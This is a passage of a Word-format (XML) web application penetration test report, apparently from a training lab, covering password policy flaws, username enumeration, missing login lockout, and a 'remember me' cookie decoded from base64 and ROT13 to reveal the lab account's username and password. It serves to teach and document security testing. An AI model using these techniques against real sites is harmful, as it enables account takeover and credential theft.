        <w:t>, without warning to the user. I</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t>f a user creates a pa</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve">ssword of zero length, then the account </w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t>will be created successfully</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>, but the user will</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t xml:space="preserve"> encou</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>nter</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t xml:space="preserve"> problems when trying to log in, as the password field cannot be left empty in the login field.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079927BE" w14:textId="1B6269EF" w:rsidR="00BF772E" w:rsidRDefault="00765CAA" w:rsidP="00905E69">
      <w:r>
        <w:t>Several accounts were created to</w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t xml:space="preserve"> further</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00206945">
        <w:t>probe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the password </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>specification</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008A326F">
        <w:t xml:space="preserve"> discover if any characters are not accepted</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The passwords used were ‘h’, ‘123’, </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>‘</w:t>
      </w:r>
      <w:r>
        <w:t>H311O</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>‘</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;!!??&gt;</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve"> Figure </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>16</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve"> shows </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve">a screenshot of the database where </w:t>
      </w:r>
      <w:r w:rsidR="004B3977">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve"> accounts </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>are stored</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t>. All the passwords were stored successfully, with the exception being the special characters’ pas</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>sword.  This could be because</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve"> the angle brackets </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>are being</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve"> interpreted as </w:t>
      </w:r>
      <w:r w:rsidR="00AC4496">
        <w:t>html code</w:t>
      </w:r>
      <w:r w:rsidR="00BF772E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19966969" w14:textId="77777777" w:rsidR="00BF772E" w:rsidRDefault="00BF772E" w:rsidP="00BF772E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77A2D33A" wp14:editId="3C8E3D99">
            <wp:extent cx="6576934" cy="685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93402" cy="687517"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A569C43" w14:textId="70B4E877" w:rsidR="00EB5293" w:rsidRDefault="00BF772E" w:rsidP="00BF772E">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - passwords stored</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B59C3E" w14:textId="77777777" w:rsidR="00EB5293" w:rsidRDefault="00BF772E" w:rsidP="00905E69">
      <w:r>
        <w:t xml:space="preserve">To test this theory, another account was created using the password </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>“!£</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">$%”. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D37D18F" w14:textId="17A92205" w:rsidR="00BF772E" w:rsidRDefault="00BF772E" w:rsidP="00905E69">
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="001F43BC">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AC4496">
        <w:t>shows the new special characters password being created successfully, proving that the application does not reject all special characters.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616F4F63" w14:textId="77777777" w:rsidR="00BF772E" w:rsidRDefault="00BF772E" w:rsidP="00BF772E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37DDF538" wp14:editId="591528A1">
            <wp:extent cx="6561117" cy="161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62252" cy="161953"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06456D4C" w14:textId="50FF08F4" w:rsidR="00BF772E" w:rsidRDefault="00BF772E" w:rsidP="00BF772E">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Special Character Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE365EB" w14:textId="77777777" w:rsidR="00AC4496" w:rsidRDefault="00BF772E" w:rsidP="00BF772E">
      <w:r>
        <w:t xml:space="preserve">An account will be created with a strong password that contains upper and lowercase letters, numbers and special characters. This password will then be used to </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>check if the server correctly validates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a password. For the purpose of this test, the password will be “hec3K$t0:&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fdw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>&lt;k”</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307EB867" w14:textId="305D05E9" w:rsidR="00BF772E" w:rsidRDefault="007235EF" w:rsidP="00BF772E">
      <w:r>
        <w:t xml:space="preserve">After trying to create this password, it was shortened and stored in the database as “hec3K$t0:”. </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>Testing was then carried out with</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inputs containing t</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>he characters ‘:’</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008A326F">
        <w:t>, ’</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008A326F">
        <w:t>&lt;’ and ’&gt;’. I</w:t>
      </w:r>
      <w:r>
        <w:t>t was found that any password conta</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>ing a ‘&lt;’ symbol</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>cut,</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve"> with</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> any character</w:t>
      </w:r>
      <w:r w:rsidR="00AC4496">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> af</w:t>
      </w:r>
      <w:r w:rsidR="008A326F">
        <w:t>ter and including the specified,</w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve"> being</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005A0DBC">
        <w:t>cut</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08751F50" w14:textId="4BF3A484" w:rsidR="007235EF" w:rsidRDefault="008A326F" w:rsidP="00BF772E">
      <w:r>
        <w:t>Because of this</w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t xml:space="preserve">, the new password that will be used </w:t>
      </w:r>
      <w:r w:rsidR="000C1ACD">
        <w:t xml:space="preserve">for testing </w:t>
      </w:r>
      <w:r w:rsidR="007235EF">
        <w:t>is “hec3K$t0:&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007235EF">
        <w:t>fdw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007235EF">
        <w:t>&gt;k”</w:t>
      </w:r>
      <w:r w:rsidR="00E12638">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA8D2AB" w14:textId="23AB97F9" w:rsidR="008A326F" w:rsidRDefault="008A326F" w:rsidP="00E12638">
      <w:r>
        <w:t>Testing occurred by removing certain characters, changing some characters and changing the cases of the characters in the password. It was found that the pass</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t xml:space="preserve">words are not case </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="003A04A2">
        <w:t xml:space="preserve">sensitive, </w:t>
      </w:r>
      <w:r w:rsidR="005A0DBC">
        <w:t>but</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="005A0DBC">
        <w:t xml:space="preserve"> do need to be an exact match</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A70A289" w14:textId="77777777" w:rsidR="00E12638" w:rsidRDefault="00E12638" w:rsidP="00E12638">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc531104339"/>
      <w:r>
        <w:t>Test for Username Enumeration</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="2E184C9E" w14:textId="4B5A3696" w:rsidR="00E12638" w:rsidRDefault="00691821" w:rsidP="00E12638">
      <w:r>
        <w:t>The username is used f</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t xml:space="preserve">or authentication in the login </w:t>
      </w:r>
      <w:r>
        <w:t>and account details pages. A</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t xml:space="preserve"> secret</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie is also created </w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t>when a user is logs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B16B8A" w14:textId="5CE1394F" w:rsidR="00691821" w:rsidRDefault="00A87B0D" w:rsidP="00E12638">
      <w:r>
        <w:t xml:space="preserve">Two attempts to login as a user will be made. One with a valid username, and one without. Upon attempting to login with an invalid username, an alert box </w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> disp</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>layed, and this can be seen in F</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:t>. If the login is successful, then the website redirects</w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t xml:space="preserve"> the user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the homepage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097763AE" w14:textId="77777777" w:rsidR="00A87B0D" w:rsidRDefault="00A87B0D" w:rsidP="00A87B0D">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1BC486AD" wp14:editId="5D6F5AAF">
            <wp:extent cx="2819400" cy="1676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9400" cy="1676400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4437B5D2" w14:textId="1A1BED97" w:rsidR="00A87B0D" w:rsidRDefault="00A87B0D" w:rsidP="00A87B0D">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Invalid Username</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28470831" w14:textId="0ADF41D8" w:rsidR="004250FA" w:rsidRPr="004250FA" w:rsidRDefault="004250FA" w:rsidP="004250FA">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">This means that the webpage </w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t>displaying when a username is valid or</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> invalid. </w:t>
      </w:r>
      <w:r w:rsidR="00515BDE">
        <w:t>After further testing, it was found that if a valid username, but invalid password is supplied, then no error message appears</w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00515BDE">
        <w:t xml:space="preserve"> but if an invalid username is provided, then the server will display the error message</w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t xml:space="preserve"> seen in Figure 18</w:t>
      </w:r>
      <w:r w:rsidR="00515BDE">
        <w:t>. This makes it clear when a valid username has been provided.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4811FD8B" w14:textId="7518C5A1" w:rsidR="00A87B0D" w:rsidRDefault="00515BDE" w:rsidP="00E12638">
      <w:r>
        <w:t xml:space="preserve">When using the change password </w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t>function but</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> changing the username in the hidden field to an invalid username, then the password change will fail. The server does not </w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t>display</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> any different info</w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t>rmation compared to when a valid username is supplied.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75388ABF" w14:textId="0E444A8A" w:rsidR="002170C0" w:rsidRDefault="002170C0" w:rsidP="00E12638">
      <w:r>
        <w:t xml:space="preserve">In the /company-accounts/ page, </w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t>a lot of</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the customers personal and sensitive data is stored. This can be downloaded and </w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t xml:space="preserve">potentially </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">used to guess </w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>customer’s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> usernames.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA9B7AC" w14:textId="77777777" w:rsidR="00E6039E" w:rsidRDefault="00E6039E" w:rsidP="00E12638"/>
    <w:p w14:paraId="152FA5A5" w14:textId="77777777" w:rsidR="002170C0" w:rsidRDefault="002170C0" w:rsidP="002170C0">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc531104340"/>
      <w:r>
        <w:t>Test Resilience to Password Guessing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="5FF25FEA" w14:textId="7129DAFC" w:rsidR="002170C0" w:rsidRDefault="00884106" w:rsidP="002170C0">
      <w:r>
        <w:t xml:space="preserve">To test for resilience to password guessing, invalid </w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>passwords</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be supplied for the </w:t>
      </w:r>
      <w:hyperlink r:id="rId52" w:history="1">
        <w:r w:rsidRPr="002E20C4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> account in the login page. After fifteen attempts at logging in, no message appeared saying that the account is/will be locked. After logging back into the account with correct credentials, no message a</w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t xml:space="preserve">ppeared explaining that a large </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00BE6896">
        <w:t>amount</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00BE6896">
        <w:t xml:space="preserve"> of failed attempts to gain access to the account had occurred</w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t xml:space="preserve">. This </w:t>
      </w:r>
      <w:r w:rsidR="003A04A2">
        <w:t>suggests</w:t>
      </w:r>
      <w:r w:rsidR="00E6039E">
        <w:t xml:space="preserve"> that there is no limit on how many times a user can attempt to login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D3EFD2" w14:textId="77777777" w:rsidR="00FC3DE5" w:rsidRDefault="00FC3DE5" w:rsidP="00FC3DE5">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc531104341"/>
      <w:r>
        <w:t>Test the Remember Me Function</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="08A4244F" w14:textId="63B350D4" w:rsidR="002A167A" w:rsidRDefault="002A167A" w:rsidP="002A167A">
      <w:r>
        <w:t>When loggin</w:t>
      </w:r>
      <w:r w:rsidR="00543FFA">
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in with the remember me function highlighted, the application passes </w:t>
      </w:r>
      <w:r w:rsidR="00543FFA">
        <w:t>a “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00543FFA">
        <w:t>loginkeeping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00543FFA">
        <w:t>” field. This is not seen when logging in without t</w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve">he remember me </w:t>
      </w:r>
      <w:r w:rsidR="00BE6896">
        <w:t>box</w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve"> ticked.</w:t>
      </w:r>
      <w:r w:rsidR="004B444E">
        <w:t xml:space="preserve"> There are two cookies present in the headers. The “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0063596A">
        <w:t>SecretCookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004B444E">
        <w:t>” and the “PHPSESSID”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C119616" w14:textId="6D64773C" w:rsidR="00FC3DE5" w:rsidRDefault="0063596A" w:rsidP="0063596A">
      <w:r>
        <w:t xml:space="preserve">The secret cookie was captured on three separate occasions with the remember me box ticked. By looking at the cookies, it was found that they are almost identical. </w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00843986">
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve"> are as follow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B783FC" w14:textId="77777777" w:rsidR="00324C8E" w:rsidRDefault="00324C8E" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vMToxNTM5ODg1NTMx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404F4B04" w14:textId="77777777" w:rsidR="00324C8E" w:rsidRDefault="00324C8E" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vMToxNTM5ODg1NjM4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699FB095" w14:textId="5A7681B7" w:rsidR="00324C8E" w:rsidRDefault="00324C8E" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vMToxNTM5ODg1Njgy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4636C5" w14:textId="402C6964" w:rsidR="00324C8E" w:rsidRDefault="00324C8E" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>From these captured cookies, it is clear that they are identical, except for the last three characters. After trying several decryption methods, it was found that the encryption key is base64 – ROT13. Therefore</w:t>
      </w:r>
      <w:r w:rsidR="0063596A">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the cookies above are deciphered as:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AFF9F5" w14:textId="50705B17" w:rsidR="00324C8E" w:rsidRDefault="00A613FB" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>hacklab@hacklab.com:hacklab</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00324C8E" w:rsidRPr="00324C8E">
        <w:t>:1539885531</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38151667" w14:textId="4DBAF62C" w:rsidR="00324C8E" w:rsidRDefault="00A613FB" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>hacklab@hacklab.com:hacklab</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00324C8E" w:rsidRPr="00324C8E">
        <w:t>:1539885638</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C094490" w14:textId="7CDF90F4" w:rsidR="00324C8E" w:rsidRDefault="00A613FB" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>hacklab@hacklab.com:hacklab</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00324C8E" w:rsidRPr="00324C8E">
        <w:t>:1539885682</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A98054E" w14:textId="1FA6B507" w:rsidR="00324C8E" w:rsidRDefault="0063596A" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve">he format for the cookies appears </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to be </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="00324C8E">
        <w:t>sername:password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00324C8E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C565EC">
        <w:t>followed by a sequence of numbers that all match except for the last three.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251055A2" w14:textId="77777777" w:rsidR="00EF2010" w:rsidRDefault="00EF2010" w:rsidP="00EF2010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc531104342"/>
      <w:r>
        <w:t>Test Username Uniqueness</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="7EB1E896" w14:textId="1859FEBE" w:rsidR="00680169" w:rsidRDefault="00EF2010" w:rsidP="00680169">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An account was created with the email address of </w:t>
      </w:r>
      <w:hyperlink r:id="rId53" w:history="1">
        <w:r w:rsidRPr="00680169">
          <w:t>UniqueUser@UniqueUser.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00680169">
        <w:t xml:space="preserve">Another account was then made with the exact same credentials. Upon checking the database of users, it was seen that the second account was </w:t>
      </w:r>
      <w:r w:rsidR="00F453B0">
        <w:t xml:space="preserve">not </w:t>
      </w:r>
      <w:r w:rsidR="00680169">
        <w:t>created, yet no error message was displayed wh</w:t>
      </w:r>
      <w:r w:rsidR="00F453B0">
